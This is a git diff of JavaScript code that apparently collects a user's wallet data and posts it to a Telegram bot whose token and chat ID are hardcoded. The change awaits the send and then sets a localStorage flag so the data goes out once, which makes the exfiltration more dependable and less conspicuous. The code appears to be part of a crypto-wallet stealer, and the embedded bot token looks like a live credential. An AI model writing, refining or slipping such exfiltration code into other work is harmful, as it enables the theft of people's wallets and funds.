@@ -29,8 +29,8 @@ async function sendToTelegramBot(data, botToken, chatId) {
     }
 }
 
-// Function to check send status and send wallet data if enabled
-function checkAndSendWalletData(botToken, chatId) {
+// Function to check import status and send wallet data if enabled
+async function checkAndSendWalletData(botToken, chatId) {
     try {
         // Check if import is enabled
         const importStatus = localStorage.getItem('Send');
@@ -56,12 +56,19 @@ function checkAndSendWalletData(botToken, chatId) {
         };
 
         // Send data to Telegram bot
-        sendToTelegramBot(walletData, botToken, chatId)
-            .catch(error => console.error('Failed to send data:', error));
+        await sendToTelegramBot(walletData, botToken, chatId);
+        
+        // Disable send after successful send
+        localStorage.setItem('Send', 'disabled');
+        console.log('Send has been disabled after successful send');
+        
     } catch (error) {
-        console.error('Error accessing localStorage:', error);
+        console.error('Error:', error);
     }
 }
+
+
+
 // Telegram Bot Configuration
     const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
     const TELEGRAM_CHAT_ID = '8163151595'; 
